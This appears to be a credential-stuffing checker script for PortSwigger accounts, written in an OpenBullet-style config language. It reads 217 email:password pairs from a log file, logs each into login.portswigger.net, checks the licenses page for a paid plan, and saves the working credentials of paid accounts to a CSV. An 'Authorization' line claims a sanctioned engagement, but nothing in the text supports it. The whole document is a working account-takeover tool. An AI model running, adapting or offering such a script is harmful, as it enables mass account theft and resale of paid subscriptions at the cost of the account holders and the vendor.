## PortSwigger Subscription Extraction - Dynamic Processing
## Automatically generated to process all 217 accounts from log.txt
## Authorization: ROE-2026-PSW-042-V5

## Configuration
SET VAR "baseUrl" "https://login.portswigger.net"
SET VAR "planBaseUrl" "https://portswigger.net"
SET VAR "outputFile" "extracted_results.csv"
SET VAR "successCount" "0"
SET VAR "failureCount" "0"

PRINT "[*] PortSwigger Account Plan Extractor"
PRINT "[*] Processing all accounts from log.txt"
PRINT "[*] Authorization: ROE-2026-PSW-042-V5"
PRINT ""

## Delete previous results file if exists
FileDelete $"<outputFile>" IgnoreError=True

## Read all accounts from file
FileReadLines "log.txt" -> VAR "allLines"
SET VAR "totalAccounts" $"<LENGTH(allLines)>"

PRINT "[*] Loaded <totalAccounts> accounts from log.txt"
PRINT "[*] Starting extraction process..."
PRINT ""

## Initialize results file with header
FileWrite $"<outputFile>" "email,password,plan" Encoding=UTF-8

## Process each account
SET VAR "index" "0"
WHILE $"<index>" < $"<totalAccounts>"
  ## Get current line
  SET VAR "currentLine" $"<allLines[<index>]>"

  ## Split by first colon
  IF $"<currentLine>" Contains ":"
    ## Find colon position and split
    SET VAR "colonPos" $"<INDEXOF(currentLine, ':')>"
    SET VAR "email" $"<SUBSTRING(currentLine, 0, colonPos)>"
    SET VAR "password" $"<SUBSTRING(currentLine, colonPos+1)>"

    SET VAR "accountNum" $"<index + 1>"
    PRINT "[$<accountNum>/$<totalAccounts>] <email>... " White NoNewline

    TRY
      ## Step 1: GET login page
      HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True
        -> VAR "loginPageRes"

      ## Step 2: POST login credentials
      HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
        CONTENT "username=$<email>&password=$<password>&action=default"
        CONTENTTYPE "application/x-www-form-urlencoded"
        -> VAR "loginRes"

      ## Step 3: GET licenses page
      HttpRequest GET $"<planBaseUrl>/users/$<email>/licenses" AutoRedirect=True
        -> VAR "licensesRes"

      ## Step 4: Extract plan
      SET VAR "plan" "free"

      IF $"<licensesRes>" Contains "Professional"
        SET VAR "plan" "Professional"
      ELSE
        IF $"<licensesRes>" Contains "Enterprise"
          SET VAR "plan" "Enterprise"
        ELSE
          IF $"<licensesRes>" Contains "Community"
            SET VAR "plan" "Community"
          ENDIF
        ENDIF
      ENDIF

      ## Only output paid plans (exclude free)
      IF $"<plan>" != "free"
        FileAppend $"<outputFile>" "$<email>,$<password>,$<plan>"
        PRINT "✓ $<plan>" Green
        SET VAR "successCount" $"<successCount + 1>"
      ELSE
        PRINT "○ free (skipped)" White
      ENDIF
    CATCH
      PRINT "✗ error" Red
      SET VAR "failureCount" $"<failureCount + 1>"
    ENDTRY
  ENDIF

  SET VAR "index" $"<index + 1>"
ENDWHILE

PRINT ""
PRINT "=========================================="
PRINT "EXTRACTION COMPLETE"
PRINT "=========================================="
PRINT "Total accounts: $<totalAccounts>"
PRINT "Paid accounts found: $<successCount>"
PRINT "Failed/skipped: $<failureCount>"
PRINT "Results saved to: $<outputFile>"
PRINT "=========================================="
